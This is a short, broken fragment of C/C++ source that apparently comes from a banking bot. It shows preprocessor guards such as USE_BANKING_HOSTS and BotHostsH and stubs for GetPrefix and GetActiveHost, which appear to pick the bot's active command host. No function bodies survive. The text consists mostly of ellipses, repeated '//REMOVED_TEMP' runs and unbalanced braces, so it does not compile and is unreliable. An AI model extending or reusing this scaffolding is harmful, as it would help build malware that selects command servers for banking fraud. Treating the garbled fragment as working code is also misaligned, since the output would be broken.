...
//=============================================================================
	...
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_BANKING_HOSTS
...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_BANKING_PREFIX
...
//  префикса
//****************************************************
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if !defined(USE_PREFIX_FILE) && defined(BotHostsH)
...
string GetPrefix(bool CheckBankingMode)
{
	...
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef USE_PREFIX_FILE
...
string GetActiveHost(bool CheckBankingMode)
{
	...
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if !defined(DEBUGCONFIG) && defined(BotHostsH)
		PCHAR H  = NULL;
...
{
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BotHostsH
